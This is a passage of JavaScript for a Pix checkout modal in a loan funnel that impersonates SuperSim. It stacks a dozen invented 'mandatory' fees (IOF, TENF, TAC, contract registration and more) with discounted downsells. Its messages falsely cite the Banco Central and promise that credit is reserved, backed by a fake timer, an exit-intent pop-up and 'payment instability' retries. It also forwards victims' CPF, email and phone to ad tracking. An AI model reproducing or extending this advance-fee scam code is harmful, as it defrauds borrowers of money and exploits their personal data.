var PIX_PRODUCTS = {
  seguro: { price: 29.63, name: "Seguro Prestamista - SuperSim" },
  up1:  { price: 24.82, name: "IOF - Imposto sobre Operações Financeiras" },
  up2:  { price: 23.91, name: "Taxa de Verificação de IOF" },
  up3:  { price: 18.68, name: "Seguro Prestamista - Tarifa de Cadastro" },
  up4:  { price: 17.20, name: "TENF - Taxa de Emissão da Nota Fiscal" },
  up5:  { price: 17.00, name: "Ativar Conta" },
  up6:  { price: 17.00, name: "Taxa de Registro do Contrato" },
  up7:  { price: 14.06, name: "Taxa - Limite Adicional de R$20.000" },
  up8:  { price: 14.06, name: "Taxa de Processamento" },
  up9:  { price: 11.99, name: "Aplicativo SuperSim" },
  up10: { price: 16.92, name: "TAC - Taxa de Abertura de Crédito" },
  up11: { price: 19.53, name: "Taxa de Consultoria Financeira" },
  up12: { price: 31.92, name: "Taxa de Processamento Administrativo" },

  // ── DOWNSELL (50% OFF) ──
  seguro_ds: { price: 14.82, name: "Seguro Prestamista - SuperSim" },
  up1_ds:  { price: 12.41, name: "IOF - Imposto sobre Operações Financeiras" },
  up2_ds:  { price: 11.96, name: "Taxa de Verificação de IOF" },
  up3_ds:  { price: 9.34,  name: "Seguro Prestamista - Tarifa de Cadastro" },
  up4_ds:  { price: 8.60,  name: "TENF - Taxa de Emissão da Nota Fiscal" },
  up5_ds:  { price: 8.50,  name: "Ativar Conta" },
  up6_ds:  { price: 8.50,  name: "Taxa de Registro do Contrato" },
  up7_ds:  { price: 7.03,  name: "Taxa - Limite Adicional de R$20.000" },
  up8_ds:  { price: 7.03,  name: "Taxa de Processamento" },
  up9_ds:  { price: 6.00,  name: "Aplicativo SuperSim" },
  up10_ds: { price: 8.46,  name: "TAC - Taxa de Abertura de Crédito" },
  up11_ds: { price: 9.77,  name: "Taxa de Consultoria Financeira" },
  up12_ds: { price: 15.96, name: "Taxa de Processamento Administrativo" },
};

// ─── helpers de rastreamento avançado ───
// event_id único p/ deduplicação browser↔CAPI (mesmo id nos dois canais → Meta não conta dobrado)
function genEventId(prefix) { return prefix + '_' + Date.now() + '_' + Math.random().toString(36).slice(2, 10); }
// fbq carrega async; espera ele existir antes de disparar (cap ~10s)
function _waitFbq(cb, tries) {
  tries = tries || 0;
  if (typeof fbq === 'function') { cb(); return; }
  if (tries > 40) return;
  setTimeout(function() { _waitFbq(cb, tries + 1); }, 250);
}
function _sha256Hex(s) {
  return crypto.subtle.digest('SHA-256', new TextEncoder().encode((s || '').toLowerCase().trim()))
    .then(function(b) { return Array.from(new Uint8Array(b)).map(function(x){return x.toString(16).padStart(2,'0');}).join(''); });
}
// telefone padrão Meta: só dígitos com DDI 55 na frente
function _phoneBR(p) { var d = (p || '').replace(/\D/g, ''); if (!d) return ''; if (d.length <= 11 && d.indexOf('55') !== 0) d = '55' + d; return d; }

// ViewContent automático — detecta o upsell pela URL e dispara ao carregar a página
(function() {
  var m = window.location.pathname.match(/\/(up\d+)\//);
  if (!m) return;
  var prod = PIX_PRODUCTS[m[1]];
  if (!prod) return;
  _waitFbq(function() {
    fbq('track', 'ViewContent', { content_name: prod.name, value: prod.price, currency: 'BRL', content_category: 'Taxa SuperSim' });
  });
})();

// external_id persistente — mesmo id usado no topo do funil (costura jornada anônima→identificada)
function _persistEid() {
  try {
    var v = localStorage.getItem('_extid');
    if (!v) { v = 'u_' + Date.now().toString(36) + Math.random().toString(36).slice(2, 12); localStorage.setItem('_extid', v); }
    return v;
  } catch (e) { return ''; }
}

// Advanced Matching MAXIMIZADO — reinit fbq com email+telefone+nome+sobrenome+cpf+id persistente
(function() {
  var nome  = localStorage.getItem('nome') || '';
  var cpf   = (localStorage.getItem('cpf') || '').replace(/\D/g, '');
  var email = (localStorage.getItem('email') || '').trim();
  var phone = _phoneBR(localStorage.getItem('telefone') || localStorage.getItem('telephone') || '');
  var eid   = _persistEid();
  if (!window.crypto || !crypto.subtle) return;
  _waitFbq(function() {
    (async function() {
      try {
        var parts = nome.trim().split(' ');
        var ud = {};
        if (email) ud.em = await _sha256Hex(email);
        if (phone) ud.ph = await _sha256Hex(phone);
        var ext = [];
        if (cpf) ext.push(await _sha256Hex(cpf));
        if (eid) ext.push(await _sha256Hex(eid));
        if (ext.length) ud.external_id = ext;
        if (parts[0]) ud.fn = await _sha256Hex(parts[0]);
        if (parts.length > 1) ud.ln = await _sha256Hex(parts[parts.length - 1]);
        fbq('init', '26918311271184563', ud);
      } catch(e) {}
    })();
  });
})();

// Captura UTMs da URL e salva no sessionStorage E no localStorage (durável até os upsells)
(function () {
  var p = new URLSearchParams(window.location.search);
  var keys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'src', 'sck'];
  var fresh = {};
  keys.forEach(function(k) { var v = p.get(k); if (v) fresh[k] = v; });
  if (Object.keys(fresh).length) {
    try { sessionStorage.setItem('_utms', JSON.stringify(fresh)); } catch (e) {}
    // localStorage sobrevive a TODA a navegação do funil (sessionStorage pode se perder em in-app browser)
    try {
      var prev = JSON.parse(localStorage.getItem('_utms') || '{}');
      localStorage.setItem('_utms', JSON.stringify(Object.assign(prev, fresh)));
    } catch (e) { try { localStorage.setItem('_utms', JSON.stringify(fresh)); } catch (e2) {} }
  }
})();

function _getFbCookies() {
  function ck(n) { var m = document.cookie.match('(^|;)\\s*' + n + '\\s*=\\s*([^;]+)'); return m ? m.pop() : null; }
  var fbp = ck('_fbp');
  var fbc = ck('_fbc');
  // Fallback: build fbc from fbclid stored in sessionStorage (in-app browsers sem cookie)
  if (!fbc) {
    var cl = sessionStorage.getItem('_fbclid');
    if (cl) fbc = 'fb.1.' + Date.now() + '.' + cl;
  }
  return { fbp: fbp, fbc: fbc };
}

function getUtms() {
  var stored = {}, durable = {};
  try { stored = JSON.parse(sessionStorage.getItem('_utms') || '{}'); } catch(e) {}
  try { durable = JSON.parse(localStorage.getItem('_utms') || '{}'); } catch(e) {}
  function ck(name) {
    var m = document.cookie.match('(^|;)\\s*' + name + '\\s*=\\s*([^;]+)');
    return m ? decodeURIComponent(m.pop()) : null;
  }
  var fromCookie = {
    src:          ck('src')          || ck('utmify_src'),
    sck:          ck('sck')          || ck('utmify_sck'),
    utm_source:   ck('utm_source')   || ck('utmify_utm_source'),
    utm_medium:   ck('utm_medium')   || ck('utmify_utm_medium'),
    utm_campaign: ck('utm_campaign') || ck('utmify_utm_campaign'),
    utm_term:     ck('utm_term')     || ck('utmify_utm_term'),
    utm_content:  ck('utm_content')  || ck('utmify_utm_content'),
  };
  var merged = {};
  ['src','sck','utm_source','utm_medium','utm_campaign','utm_term','utm_content'].forEach(function(k) {
    merged[k] = stored[k] || durable[k] || fromCookie[k] || null;
  });
  return merged;
}

var PIX_MESSAGES = {
  seguro: { emoji: '🛡️', titulo: 'Contrate o Seguro e libere seu crédito!', sub: 'O Seguro Prestamista é obrigatório para liberar o valor com segurança na sua conta. Pague a taxa única e o crédito é liberado via Pix.' },
  up1:  { emoji: '🏦', titulo: 'Pague o IOF e libere seu crédito!',         sub: 'O Imposto sobre Operações Financeiras é obrigatório pelo Banco Central para autorizar a liberação do valor na sua conta.' },
  up2:  { emoji: '✅', titulo: 'Última verificação de IOF.',                 sub: 'Confirme o pagamento da taxa e o processo de liberação do seu crédito será concluído em minutos.' },
  up3:  { emoji: '🛡️', titulo: 'Seguro Ativo = Empréstimo Garantido',        sub: 'O Seguro Prestamista protege seu contrato e garante que o valor seja liberado com segurança para sua conta.' },
  up4:  { emoji: '🧾', titulo: 'Emita sua Nota Fiscal agora!',               sub: 'A TENF é necessária para formalizar a operação com o Banco Central. Pague e avance para a etapa final.' },
  up5:  { emoji: '⚡', titulo: 'Ative sua conta e receba hoje!',             sub: 'Com a conta ativada, seu crédito será depositado em até 5 minutos. Você está a apenas um passo!' },
  up6:  { emoji: '📝', titulo: 'Registre seu contrato em cartório',          sub: 'O Registro do Contrato garante a validade legal do seu empréstimo. Etapa obrigatória para liberação.' },
  up7:  { emoji: '💰', titulo: 'Libere mais R$ 20.000 agora!',               sub: 'Você foi pré-aprovado para um limite adicional. Pague a taxa agora e o valor extra é liberado imediatamente.' },
  up8:  { emoji: '🔄', titulo: 'Seu crédito ainda está disponível!',         sub: 'Houve uma instabilidade no pagamento anterior. Seu limite ainda está reservado — tente novamente agora.' },
  up9:  { emoji: '📱', titulo: 'Acesso ao App SuperSim',                    sub: 'Com o aplicativo você acompanha seu empréstimo, parcelas e extratos em tempo real direto do celular.' },
  up10: { emoji: '📋', titulo: 'Última etapa! Pague a TAC.',                 sub: 'A Taxa de Abertura de Crédito cobre os custos operacionais. Após o pagamento, o valor é liberado na sua conta.' },
  up11: { emoji: '👨‍💼', titulo: 'Nossos especialistas estão prontos!',        sub: 'A Taxa de Consultoria Financeira viabiliza a análise personalizada do seu perfil. Último passo antes da liberação.' },
  up12: { emoji: '🎯', titulo: 'Quase lá! Última taxa.',                     sub: 'A Taxa de Processamento Administrativo garante a transferência segura do valor para sua conta. Etapa final!' },
};

document.addEventListener('DOMContentLoaded', function() {
  var style = document.createElement('style');
  style.textContent = [
    '@keyframes pixSpin{to{transform:rotate(360deg)}}',
    '@keyframes pixPulse{0%,100%{opacity:1}50%{opacity:0.25}}',
    '@keyframes pixFadeIn{from{opacity:0;transform:translateY(28px)}to{opacity:1;transform:translateY(0)}}',
    '@keyframes pixCheckIn{from{transform:scale(0) rotate(-20deg);opacity:0}to{transform:scale(1) rotate(0deg);opacity:1}}',
    '@keyframes pixBarLoop{0%{left:-40%;width:40%}60%{left:50%;width:50%}100%{left:110%;width:40%}}',
    '@keyframes pixSlideUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}',
    '@keyframes pixGlow{0%,100%{box-shadow:0 0 0 0 rgba(210,118,10,0.3)}50%{box-shadow:0 0 0 8px rgba(210,118,10,0)}}',
    '#pix-modal *{box-sizing:border-box;-webkit-font-smoothing:antialiased;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;}',
    '#pix-modal-card{animation:pixFadeIn 0.38s cubic-bezier(.22,.68,0,1.15) forwards;}',
    '#pix-copy-btn{transition:transform 0.12s,background 0.2s;}',
    '#pix-copy-btn:active{transform:scale(0.95);}',
    '#pix-qr-wrap{animation:pixGlow 2.5s ease-in-out infinite;}',
  ].join('');
  document.head.appendChild(style);

  var el = document.createElement('div');
  el.id = 'pix-modal';
  el.style.cssText = 'display:none;position:fixed;z-index:99999;inset:0;background:rgba(20,15,10,0.78);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);align-items:center;justify-content:center;padding:10px;';

  el.innerHTML = [
    '<div id="pix-modal-card" style="background:#fff;border-radius:26px;width:100%;max-width:430px;box-shadow:0 40px 100px rgba(0,0,0,0.45),0 0 0 1px rgba(0,0,0,0.05);overflow:hidden;max-height:97vh;overflow-y:auto;">',

      /* ─── HEADER ─── */
      '<div style="background:linear-gradient(140deg,#241811 0%,#7c4a08 45%,#D2760A 100%);padding:18px 22px 16px;position:relative;overflow:hidden;">',
        /* decoração */
        '<div style="position:absolute;top:-40px;right:-40px;width:140px;height:140px;background:rgba(255,255,255,0.05);border-radius:50%;pointer-events:none;"></div>',
        '<div style="position:absolute;bottom:-25px;left:80px;width:90px;height:90px;background:rgba(255,255,255,0.03);border-radius:50%;pointer-events:none;"></div>',
        /* linha 1 — logo + timer */
        '<div style="display:flex;align-items:center;justify-content:space-between;position:relative;margin-bottom:10px;">',
          '<div style="display:flex;align-items:center;gap:9px;">',
            '<div style="width:34px;height:34px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.2);border-radius:9px;display:flex;align-items:center;justify-content:center;flex-shrink:0;">',
              '<svg width="18" height="18" fill="none" viewBox="0 0 24 24"><path fill="#fff" d="m15.45 16.52-3.01-3.01c-.17-.17-.45-.17-.62 0L8.8 16.53c-.34.34-.87.89-2.64.89l3.71 3.7a3 3 0 0 0 4.24 0l3.72-3.71c-.91 0-1.67-.18-2.38-.89M8.8 7.47l3.02 3.02c.17.17.45.17.62 0l2.99-2.99c.71-.74 1.52-.91 2.43-.91l-3.72-3.71a3 3 0 0 0-4.24 0l-3.71 3.7c1.76 0 2.3.58 2.61.89"/><path fill="#fff" d="m21.11 9.85-2.25-2.26H17.6c-.54 0-1.08.22-1.45.61l-3 3c-.56.56-1.48.56-2.04 0L8.09 8.17c-.38-.38-.9-.6-1.45-.6H5.17l-2.29 2.3a3 3 0 0 0 0 4.24l2.29 2.3h1.48c.54 0 1.06-.22 1.45-.6l3.02-3.02c.56-.56 1.48-.56 2.04 0l3.01 3.01c.38.38.9.6 1.45.6h1.26l2.25-2.26a3.04 3.04 0 0 0-.02-4.29"/></svg>',
            '</div>',
            '<div>',
              '<div style="color:#fff;font-weight:700;font-size:14px;line-height:1.2;">Pagamento via Pix</div>',
              '<div style="color:rgba(255,255,255,0.6);font-size:10.5px;">Confirmação automática e imediata</div>',
            '</div>',
          '</div>',
          '<div id="pix-timer" style="background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.18);color:#fff;padding:5px 11px;border-radius:100px;font-size:12px;font-weight:700;letter-spacing:0.3px;white-space:nowrap;">⏳ 15:00</div>',
        '</div>',
        /* linha 2 — saudação */
        '<div id="pix-header-name" style="display:none;background:rgba(255,255,255,0.08);border:1px solid rgba(255,255,255,0.12);border-radius:10px;padding:7px 12px;position:relative;">',
          '<span style="color:rgba(255,255,255,0.55);font-size:11px;">Olá, </span>',
          '<span id="pix-user-name" style="color:#EAB861;font-size:11px;font-weight:700;"></span>',
          '<span style="color:rgba(255,255,255,0.55);font-size:11px;"> — seu limite está reservado e aguardando pagamento.</span>',
        '</div>',
      '</div>',

      /* ─── LOADING ─── */
      '<div id="pix-loading" style="padding:56px 24px;text-align:center;">',
        '<div style="width:54px;height:54px;border:4px solid #e5e7eb;border-top-color:#D2760A;border-radius:50%;animation:pixSpin 0.75s linear infinite;margin:0 auto 18px;"></div>',
        '<p style="color:#111827;font-size:15px;margin:0 0 5px;font-weight:700;">Gerando seu Pix...</p>',
        '<p style="color:#9ca3af;font-size:13px;margin:0;">Conectando com o Banco Central</p>',
      '</div>',

      /* ─── CONTEÚDO ─── */
      '<div id="pix-content" style="display:none;">',

        /* REFRAME DE VALOR — falta só X pra liberar Y */
        '<div id="pix-reframe" style="margin:16px 20px 0;background:linear-gradient(135deg,#7c4a08,#D2760A);color:#fff;border-radius:15px;padding:14px 16px;text-align:center;box-shadow:0 12px 28px -14px rgba(140,84,12,.6);">',
          '<div style="font-size:11px;color:#F5DDAC;font-weight:700;letter-spacing:.5px;text-transform:uppercase;">✅ Seu crédito está reservado</div>',
          '<div id="pix-reframe-credit" style="font-size:28px;font-weight:900;letter-spacing:-.8px;margin:2px 0 1px;">R$ 0</div>',
          '<div style="font-size:13px;color:#F7E8CE;">falta só <b id="pix-reframe-fee" style="color:#fff;">R$ 0</b> pra liberar na sua conta</div>',
        '</div>',
        /* ESCASSEZ */
        '<div style="margin:10px 20px 0;display:flex;align-items:center;gap:8px;background:#fff7ed;border:1px solid #fed7aa;border-radius:11px;padding:9px 12px;font-size:11.5px;color:#9a3412;font-weight:600;line-height:1.4;">',
          '<span style="font-size:15px;flex-shrink:0;">⏳</span> Seu limite fica reservado só durante o tempo acima. Depois, volta para a fila.',
        '</div>',

        /* mensagem da oferta */
        '<div style="padding:16px 20px 0;">',
          '<div style="background:linear-gradient(135deg,#FDF3E3,#F8E9D2);border:1px solid rgba(210,118,10,0.18);border-radius:14px;padding:13px 15px;display:flex;gap:10px;align-items:flex-start;">',
            '<span id="pix-msg-emoji" style="font-size:22px;line-height:1;flex-shrink:0;margin-top:1px;"></span>',
            '<div>',
              '<div id="pix-msg-titulo" style="font-size:13.5px;font-weight:700;color:#7c4a08;margin-bottom:3px;line-height:1.3;"></div>',
              '<div id="pix-msg-sub" style="font-size:12px;color:#374151;line-height:1.55;"></div>',
            '</div>',
          '</div>',
        '</div>',

        /* valor */
        '<div style="padding:14px 20px 0;text-align:center;">',
          '<div style="display:inline-flex;align-items:baseline;gap:6px;background:#f9fafb;border:2px solid #e5e7eb;border-radius:14px;padding:10px 22px;">',
            '<span style="font-size:12px;color:#6b7280;font-weight:500;">Total a pagar:</span>',
            '<span id="pix-amount-display" style="font-size:24px;font-weight:800;color:#111827;letter-spacing:-0.5px;"></span>',
          '</div>',
        '</div>',

        /* QR code + instruções */
        '<div style="padding:14px 20px 0;">',
          '<div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">',
            '<div style="flex:1;height:1px;background:#f0f0f0;"></div>',
            '<span style="font-size:10.5px;color:#9ca3af;white-space:nowrap;">Escaneie o QR Code</span>',
            '<div style="flex:1;height:1px;background:#f0f0f0;"></div>',
          '</div>',
          '<div style="text-align:center;">',
            '<div id="pix-qr-wrap" style="display:inline-block;background:#fff;border:2px solid #e5e7eb;border-radius:18px;padding:10px;">',
              '<img id="pix-qr-img" src="" alt="QR Code Pix" width="188" height="188" style="display:block;border-radius:10px;">',
            '</div>',
          '</div>',
          /* mini guia de 3 passos */
          '<div style="display:flex;justify-content:center;gap:0;margin-top:11px;">',
            _pixStep('1', 'Abra seu banco'),
            _pixArrow(),
            _pixStep('2', 'Escaneie o QR'),
            _pixArrow(),
            _pixStep('3', 'Confirme e pronto'),
          '</div>',
        '</div>',

        /* código copia e cola */
        '<div style="padding:14px 20px 0;">',
          '<div style="display:flex;align-items:center;gap:6px;margin-bottom:8px;">',
            '<div style="flex:1;height:1px;background:#f0f0f0;"></div>',
            '<span style="font-size:10.5px;color:#9ca3af;white-space:nowrap;padding:0 6px;">ou use o código Pix Copia e Cola</span>',
            '<div style="flex:1;height:1px;background:#f0f0f0;"></div>',
          '</div>',
          '<div style="display:flex;gap:8px;">',
            '<input id="pix-code" type="text" readonly style="flex:1;min-width:0;padding:11px 13px;border:1.5px solid #e5e7eb;border-radius:12px;font-size:10.5px;color:#374151;background:#fafafa;font-family:monospace;outline:none;" value="">',
            '<button id="pix-copy-btn" onclick="pixCopyCode(this)" style="background:linear-gradient(135deg,#D2760A,#A85A08);color:#fff;border:none;border-radius:12px;padding:11px 17px;font-weight:700;cursor:pointer;font-size:13px;white-space:nowrap;box-shadow:0 3px 10px rgba(210,118,10,0.3);">Copiar</button>',
          '</div>',
        '</div>',

        /* status */
        '<div style="padding:14px 20px;">',
          '<div style="background:#FDF3E3;border:1.5px solid #F1DDB6;border-radius:14px;padding:12px 14px;overflow:hidden;position:relative;">',
            '<div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">',
              '<span style="display:inline-block;width:8px;height:8px;background:#D2760A;border-radius:50%;animation:pixPulse 1.4s ease-in-out infinite;flex-shrink:0;"></span>',
              '<span style="font-size:12.5px;color:#A85A08;font-weight:600;">Verificando pagamento automaticamente...</span>',
            '</div>',
            '<div style="height:3px;background:#F1DDB6;border-radius:3px;overflow:hidden;position:relative;">',
              '<div style="position:absolute;height:100%;background:linear-gradient(90deg,#D2760A,#EE9412,#D2760A);border-radius:3px;animation:pixBarLoop 2.2s ease-in-out infinite;"></div>',
            '</div>',
          '</div>',
        '</div>',

        /* botão "já paguei" */
        '<div style="padding:0 20px 6px;">',
          '<button id="pix-paid-check" type="button" onclick="pixCheckNow(this)" style="width:100%;background:#fff;border:1.6px solid #D2760A;color:#A85A08;border-radius:12px;padding:12px;font-weight:800;font-size:13.5px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:7px;">',
            '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg> Já fiz o pagamento',
          '</button>',
          '<div id="pix-paid-check-msg" style="display:none;text-align:center;font-size:11.5px;color:#6b7280;margin-top:7px;line-height:1.4;"></div>',
        '</div>',

        /* rodapé — selos */
        '<div style="padding:0 20px 18px;display:flex;justify-content:center;gap:18px;flex-wrap:wrap;border-top:1px solid #f3f4f6;padding-top:14px;">',
          _pixSeal('<path stroke="#A85A08" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>', 'Ambiente 100% seguro'),
          _pixSeal('<rect x="3" y="11" width="18" height="11" rx="2" ry="2" stroke="#A85A08" stroke-width="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="#A85A08" stroke-width="2" stroke-linecap="round"/>', 'Criptografia SSL'),
          _pixSeal('<circle cx="12" cy="12" r="10" stroke="#A85A08" stroke-width="2"/><polyline points="12 6 12 12 16 14" stroke="#A85A08" stroke-width="2" stroke-linecap="round"/>', 'Confirmação na hora'),
        '</div>',

      '</div>',

      /* ─── PAGO ─── */
      '<div id="pix-paid" style="display:none;padding:56px 24px;text-align:center;">',
        '<div style="width:84px;height:84px;background:linear-gradient(135deg,#F1DDB6,#E9C588);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 22px;box-shadow:0 12px 32px rgba(210,118,10,0.3);">',
          '<svg width="42" height="42" fill="none" stroke="#A85A08" viewBox="0 0 24 24" style="animation:pixCheckIn 0.45s cubic-bezier(.22,.68,0,1.2) both;"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/></svg>',
        '</div>',
        '<h3 style="margin:0 0 6px;color:#111827;font-size:22px;font-weight:800;">Pagamento confirmado!</h3>',
        '<p style="color:#6b7280;font-size:14px;margin:0 0 24px;line-height:1.5;">Obrigado! Avançando para a próxima etapa...</p>',
        '<div style="display:flex;align-items:center;justify-content:center;gap:7px;">',
          '<div style="width:8px;height:8px;background:#D2760A;border-radius:50%;animation:pixPulse 0.6s ease-in-out infinite;"></div>',
          '<div style="width:8px;height:8px;background:#D2760A;border-radius:50%;animation:pixPulse 0.6s 0.15s ease-in-out infinite;"></div>',
          '<div style="width:8px;height:8px;background:#D2760A;border-radius:50%;animation:pixPulse 0.6s 0.3s ease-in-out infinite;"></div>',
        '</div>',
      '</div>',

    '</div>',
  ].join('');

  document.body.appendChild(el);

  /* pop de retenção (exit-intent ao apertar voltar) */
  var retain = document.createElement('div');
  retain.id = 'pix-retain';
  retain.style.cssText = 'display:none;position:fixed;inset:0;z-index:100000;background:rgba(20,15,10,.86);backdrop-filter:blur(6px);align-items:center;justify-content:center;padding:22px;font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;';
  retain.innerHTML = [
    '<div style="background:#fff;border-radius:22px;max-width:360px;width:100%;padding:26px 22px;text-align:center;box-shadow:0 30px 70px rgba(0,0,0,.5);">',
      '<div style="font-size:44px;line-height:1;margin-bottom:8px;">🎁</div>',
      '<h3 style="margin:0 0 8px;font-size:20px;font-weight:900;color:#7c4a08;">Espera! Não perca seu crédito</h3>',
      '<p style="margin:0 0 18px;font-size:14px;color:#374151;line-height:1.5;">Seus <b id="pix-retain-credit" style="color:#7c4a08;">R$ 0</b> ainda estão <b>reservados</b>. Falta só pagar a taxa pra liberar na sua conta — leva 1 minuto.</p>',
      '<button type="button" onclick="pixRetainStay()" style="width:100%;background:linear-gradient(135deg,#D2760A,#A85A08);color:#fff;border:0;border-radius:13px;padding:15px;font-weight:800;font-size:15.5px;cursor:pointer;box-shadow:0 14px 28px -12px rgba(168,90,8,.7);">Continuar e liberar meu crédito</button>',
    '</div>'
  ].join('');
  document.body.appendChild(retain);
});

/* helpers de string para o HTML do modal */
function _pixStep(n, label) {
  return '<div style="text-align:center;flex:1;">'
    + '<div style="width:22px;height:22px;background:#FDF3E3;border:1.5px solid #EAB861;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 4px;font-size:10px;font-weight:700;color:#A85A08;">' + n + '</div>'
    + '<div style="font-size:10px;color:#6b7280;line-height:1.3;">' + label + '</div>'
    + '</div>';
}
function _pixArrow() {
  return '<div style="font-size:11px;color:#d1d5db;padding:0 2px;margin-top:4px;">›</div>';
}
function _pixSeal(pathSvg, text) {
  return '<span style="display:flex;align-items:center;gap:5px;font-size:10.5px;color:#6b7280;">'
    + '<svg width="13" height="13" fill="none" viewBox="0 0 24 24">' + pathSvg + '</svg>'
    + text
    + '</span>';
}

/* ─── lógica ─── */

var _pixPollInterval = null;
var _pixTimerInterval = null;
var _pixTimerSecs = 900;
var _pixCurrentTxn = null;
var _pixCurrentAmount = 0;
var _pixCurrentUpKey = '';
var _pixPurchaseFired = false;

// Purchase no navegador quando o pagamento confirma — eventID = txnId (mesmo do webhook CAPI → dedup)
function _pixFirePurchase() {
  if (_pixPurchaseFired || !_pixCurrentTxn) return;
  _pixPurchaseFired = true;
  if (typeof fbq !== 'function') return;
  fbq('track', 'Purchase', { value: Number(_pixCurrentAmount) || 0, currency: 'BRL' }, { eventID: String(_pixCurrentTxn) });
  // Venda da oferta PRINCIPAL (front = seguro) → evento custom separado p/ otimizar aquisição
  var base = (_pixCurrentUpKey || '').replace('_ds', '');
  if (base === 'seguro') {
    fbq('trackCustom', 'PurchaseFront', { value: Number(_pixCurrentAmount) || 0, currency: 'BRL' }, { eventID: String(_pixCurrentTxn) + '_front' });
  }
}

function redirect(upKey) {
  _pixOpenModal(upKey);
}

function _pixOpenModal(upKey) {
  var modal = document.getElementById('pix-modal');
  if (!modal) return;

  modal.style.display = 'flex';
  _pixPurchaseFired = false;
  _pixCurrentUpKey = upKey;

  // event_ids p/ dedup: dispara no navegador com {eventID} e manda os MESMOS ids p/ a CAPI (/api/pix)
  var _icEventId = genEventId('ic');
  var _leadEventId = genEventId('lead');
  if (typeof fbq === 'function') {
    var _prod = PIX_PRODUCTS[upKey];
    fbq('track', 'InitiateCheckout', _prod ? { value: _prod.price, currency: 'BRL', content_name: _prod.name } : {}, { eventID: _icEventId });
    fbq('track', 'Lead', {}, { eventID: _leadEventId });
  }
  document.getElementById('pix-loading').style.display = 'block';
  document.getElementById('pix-content').style.display = 'none';
  document.getElementById('pix-paid').style.display = 'none';

  var nome  = localStorage.getItem('nome') || '';
  var cpf   = localStorage.getItem('cpf')  || '';
  var email = localStorage.getItem('email') || '';
  var phone = localStorage.getItem('telefone') || localStorage.getItem('telephone') || '';
  var utms = getUtms();

  // mostra saudação se tiver nome
  if (nome) {
    var firstName = nome.split(' ')[0];
    document.getElementById('pix-user-name').textContent = firstName;
    document.getElementById('pix-header-name').style.display = 'block';
  }

  var fbCookies = _getFbCookies();
  fetch('/api/pix', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ upKey: upKey, nome: nome, cpf: cpf, email: email, phone: phone, eid: _persistEid(), utms: utms, fbp: fbCookies.fbp, fbc: fbCookies.fbc, icEventId: _icEventId, leadEventId: _leadEventId })
  })
  .then(function(r) { return r.json(); })
  .then(function(data) {
    if (!data.success) {
      alert('Erro ao gerar o Pix. Tente novamente.');
      _pixCloseModal();
      return;
    }

    var msg = PIX_MESSAGES[upKey] || PIX_MESSAGES[upKey.replace('_ds', '')] || { emoji: '💳', titulo: 'Pagamento via Pix', sub: 'Pague agora e continue o processo.' };
    document.getElementById('pix-msg-emoji').textContent = msg.emoji;
    document.getElementById('pix-msg-titulo').textContent = msg.titulo;
    document.getElementById('pix-msg-sub').textContent = msg.sub;

    var amountFmt = 'R$ ' + Number(data.amount).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    document.getElementById('pix-amount-display').textContent = amountFmt;

    document.getElementById('pix-qr-img').src =
      'https://api.qrserver.com/v1/create-qr-code/?data=' + encodeURIComponent(data.qrcode) + '&size=188x188&margin=6&bgcolor=ffffff';

    document.getElementById('pix-code').value = data.qrcode;

    // reframe de valor: "falta só X pra liberar seus R$ Y"
    _pixCurrentTxn = data.txnId;
    _pixCurrentAmount = data.amount;
    var credit = parseFloat(localStorage.getItem('selectedLoanAmount')) || 0;
    var rf = document.getElementById('pix-reframe');
    if (credit > 0 && rf) {
      var creditFmt = 'R$ ' + credit.toLocaleString('pt-BR', { minimumFractionDigits: 0, maximumFractionDigits: 0 });
      document.getElementById('pix-reframe-credit').textContent = creditFmt;
      document.getElementById('pix-reframe-fee').textContent = amountFmt;
      var rc = document.getElementById('pix-retain-credit'); if (rc) rc.textContent = creditFmt;
      rf.style.display = '';
    } else if (rf) { rf.style.display = 'none'; }

    document.getElementById('pix-loading').style.display = 'none';
    document.getElementById('pix-content').style.display = 'block';
    // AddPaymentInfo (viu o QR) — navegador + CAPI com dedup pelo mesmo eventID
    if (typeof fbq === 'function') {
      var _apiEventId = genEventId('api');
      fbq('track', 'AddPaymentInfo', { value: data.amount, currency: 'BRL' }, { eventID: _apiEventId });
      fetch('/api/track', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ eventName: 'AddPaymentInfo', eventId: _apiEventId, value: data.amount, email: email, phone: phone, nome: nome, cpf: cpf, eid: _persistEid(), fbp: fbCookies.fbp, fbc: fbCookies.fbc }),
        keepalive: true,
      }).catch(function () {});
    }

    _pixStartTimer();
    _pixStartPolling(data.txnId);
  })
  .catch(function() {
    alert('Erro de conexão. Tente novamente.');
    _pixCloseModal();
  });
}

function pixCopyCode(btn) {
  var code = document.getElementById('pix-code').value;
  function onCopied() {
    btn.textContent = '✓ Copiado!';
    btn.style.background = 'linear-gradient(135deg,#A85A08,#7c4a08)';
    setTimeout(function() {
      btn.textContent = 'Copiar';
      btn.style.background = 'linear-gradient(135deg,#D2760A,#A85A08)';
    }, 2500);
  }
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(code).then(onCopied).catch(function() { _pixFallbackCopy(onCopied); });
  } else {
    _pixFallbackCopy(onCopied);
  }
}

function _pixFallbackCopy(cb) {
  var input = document.getElementById('pix-code');
  input.select();
  input.setSelectionRange(0, 99999);
